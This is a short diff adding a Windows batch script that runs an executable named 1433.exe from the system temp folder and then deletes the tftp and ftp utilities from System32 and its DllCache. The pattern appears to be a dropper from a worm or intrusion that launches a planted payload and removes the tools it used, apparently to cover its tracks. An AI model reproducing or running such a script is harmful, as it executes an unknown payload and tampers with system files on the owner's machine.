@@ -1,0 +1,6 @@
+@echo off
+%systemroot%\temp\1433.exe
+@del %Systemroot%\System32\DllCache\tftp.exe 
+@del %Systemroot%\System32\DllCache\ftp.exe 
+@del %Systemroot%\System32\tftp.exe
+@del %Systemroot%\System32\ftp.exe
